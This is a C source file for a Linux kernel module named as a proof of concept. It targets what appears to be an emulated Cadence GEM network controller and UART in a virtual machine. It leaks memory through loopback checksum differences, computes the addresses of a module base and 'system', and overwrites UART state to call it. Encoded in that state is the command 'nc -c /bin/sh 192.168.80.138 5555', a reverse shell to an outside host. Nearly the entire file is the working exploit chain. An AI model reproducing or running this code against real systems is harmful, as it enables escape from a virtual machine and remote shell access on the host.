
#include <linux/module.h>
#include <linux/init.h>
#include <asm/io.h>
#include <linux/mm.h>


#define GEM_NWCTRL        	(0x00000000/4) /* Network Control reg */
#define GEM_TXQBASE       	(0x0000001C/4) /* TX Q Base address reg */
#define GEM_RXQBASE       	(0x00000018/4) /* RX Q Base address reg */
#define GEM_PHYMNTNC 	  	(0x00000034/4) /* Phy Maintenance reg */
#define GEM_PHYMNTNC_OP_W  	0x10000000     /* write operation */
#define GEM_NWCTRL_TXSTART      0x00000200     /* Transmit Enable */
#define GEM_PHYMNTNC_REG_SHIFT  18
#define PHY_REG_CONTROL 0
#define GEM_PHYMNTNC_REG 	0x007c0000
#define PHY_REG_CONTROL_LOOP   	0x4000
#define DESC_1_TX_LAST  	0x00008000

#define INIT_LENGTH 		0x81a
#define INIT_GEMSTATE_LENGTH  	0x83a

#define UART_WRITE 		0xe0001000
#define CDN_GEM 		0xe000b000

unsigned int 	*pgem;
unsigned int 	*puart;

uint32_t read_reg(int index)
{
    return *(pgem+index);
}
void write_reg(int index,uint32_t val)
{
    pgem[index] = val;
}

void fillBuf(char *buf,int len)
{
    buf[0] = '\x52';
    buf[1] = '\x54';
    buf[2] = '\x00';
    buf[3] = '\x12';
    buf[4] = '\x34';
    buf[5] = '\x56'; 
    buf[6] = '\x52';
    buf[7] = '\x54';
    buf[8] = '\x00';
    buf[9] = '\x12';
    buf[10] = '\x34';
    buf[11] = '\x56';
    buf[12] = '\x08';
    buf[13] = '\x00';
    buf[14] = '\x45';
    buf[15] = '\x00';
    //buf[16] = '\x07';
    //buf[17] = '\xf2';//07f2 -> cover the whole 2048 bytes
    //buf[16] = '\x08';
    //buf[17] = '\x1a';
    buf[16] = len >> 8;
    buf[17] = len & 0xff;
    buf[23] = '\x06';
}


void get_data(int init_len,unsigned char *retbuf,int len)
{

    char 		buf[2048];
    unsigned 		senddesc[4];
    uint32_t 		nwctrl;
    uint32_t 		psenddesc;
    char 		recvbuf[2048];
    unsigned 		recvdesc[2];
    uint32_t 		precvdesc;
    int 		i = 0;
    unsigned int 	tmp;
    unsigned char 	guess_bytes;
    uint16_t 		csum1 = 0;
    uint16_t 		csum2 = 0;
    int 		fillLen = init_len;

    if(buf == NULL || len < 8)
	return;

    memset(buf,'\x00',2048);
    memset(recvbuf,'\x00',2048);
    fillBuf(buf,fillLen);
    nwctrl = read_reg(GEM_PHYMNTNC);
    nwctrl &= ~GEM_PHYMNTNC_REG;

    write_reg(GEM_PHYMNTNC,nwctrl | GEM_PHYMNTNC_OP_W | (PHY_REG_CONTROL << GEM_PHYMNTNC_REG_SHIFT) | PHY_REG_CONTROL_LOOP);// open phy loopback
    
    senddesc[0] = virt_to_phys(buf);
    senddesc[1] = 2048 | DESC_1_TX_LAST;
    senddesc[2] = 0;
    senddesc[3] = 0;
    recvdesc[0] = virt_to_phys(recvbuf);
    recvdesc[1] = 2048;
    psenddesc = virt_to_phys(senddesc);   
    precvdesc = virt_to_phys(recvdesc);
    write_reg(GEM_TXQBASE,psenddesc);
    write_reg(GEM_RXQBASE,precvdesc);
    nwctrl = read_reg(GEM_NWCTRL);
    write_reg(GEM_NWCTRL,nwctrl | GEM_NWCTRL_TXSTART);
    csum1 = recvbuf[52] << 8 | recvbuf[53];

    for(i = 0;i < 8;++i)
    {
	fillBuf(buf,fillLen+i+1);
	senddesc[0] = virt_to_phys(buf);
	senddesc[1] = 2048 | DESC_1_TX_LAST;
	senddesc[2] = 0;
	senddesc[3] = 0;
	recvdesc[0] = virt_to_phys(recvbuf);
	recvdesc[1] = 2048;
	write_reg(GEM_TXQBASE,psenddesc);
	write_reg(GEM_RXQBASE,precvdesc);
	write_reg(GEM_NWCTRL,nwctrl | GEM_NWCTRL_TXSTART);
	csum2 = recvbuf[52] << 8 | recvbuf[53];
  	tmp = (~csum2 & 0xffff) - (~csum1 & 0xffff);
        guess_bytes = tmp > 255? (tmp >> 8) & 0xff:tmp-1; 
       // printk("guess_bytes               = %02x\n",guess_bytes);     
   	retbuf[i] = guess_bytes;
	csum1 = csum2;
    }

    return;
}

int init_poc(void)
{

    unsigned char 		address[8];
    unsigned char 		gemstate[8];
    unsigned long long 		retaddr =0;
    unsigned long long 		gemstateaddr = 0;
    unsigned long long 		uartstateaddr = 0;
    unsigned long long 		chraddr = 0;
    unsigned long long 		modulebaseaddr = 0;
    unsigned long long 		systemaddr = 0;
    unsigned long long 		cmdaddr = 0;

    printk("[+] enter init\n");
    pgem = ioremap(CDN_GEM,0x640);
    puart = ioremap(UART_WRITE,0x1000);
    get_data(INIT_LENGTH,address,8);
    address[0] = 0x27 ;
   // address[5] = 0x7f;
    address[6] = address[7] = 0;
    retaddr = *(unsigned long long*)address;
 
    printk("[+] ret address = 0x%llx\n",retaddr);
    modulebaseaddr = retaddr - 0x443F27;
    printk("[+] module base address is:0x%llx\n",modulebaseaddr);
    get_data(INIT_GEMSTATE_LENGTH,gemstate,8);
    gemstate[0] = 0x30;
    //gemstate[5] = 0x7f;
    gemstate[6] = gemstate[7] = 0;
    gemstateaddr = *(unsigned long long*)gemstate;
    printk("[+] gemstate addrress:0x%llx\n",gemstateaddr);
  
    uartstateaddr = gemstateaddr - 0x6d1a0;
    
    printk("[+] uartstate addrress is:0x%llx\n",uartstateaddr);
    chraddr = uartstateaddr + 1200;
    printk("[+] chr addrress is:0x%llx\n",chraddr);
    systemaddr = modulebaseaddr + 0x2901eb; 

    printk("[+] system address is:0x%llx\n",systemaddr);

    cmdaddr = chraddr;
 
    *(puart+0x14/4)=0;
    *(puart+(1200 - 1008 + 40)/4) = systemaddr & 0xffffffff;
    *(puart+(1200 - 1008 + 40)/4 + 1) = (systemaddr >> 32) & 0xffffffff;
    *(puart+(1200 - 1008 + 40)/4 + 2) = cmdaddr & 0xffffffff;
    *(puart+(1200 - 1008 + 40)/4 + 3) = (cmdaddr >> 32) & 0xffffffff;
    *(puart+(1200 - 1008)/4 + 0) = 0x2d20636e;// shellcode "nc -c /bin/sh 192.168.80.138 5555"
    *(puart+(1200 - 1008)/4 + 1) = 0x622f2063;
    *(puart+(1200 - 1008)/4 + 2) = 0x732f6e69;
    *(puart+(1200 - 1008)/4 + 3) = 0x39312068;
    *(puart+(1200 - 1008)/4 + 4) = 0x36312e32;
    *(puart+(1200 - 1008)/4 + 5) = 0x30382e38;
    *(puart+(1200 - 1008)/4 + 6) = 0x3136312e;
    *(puart+(1200 - 1008)/4 + 7) = 0x35353520;
    *(puart+(1200 - 1008)/4 + 8) = 0x35;
		
    *(puart+32+2+1) = (chraddr >>32) & 0xffffffff;
    *(puart+32+2) = chraddr & 0xffffffff;
    printk("enter leave\n");
    return 0;
}

void deinit_module(void)
{
    
}

module_init(init_poc);
module_exit(deinit_module);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Qiang Li");
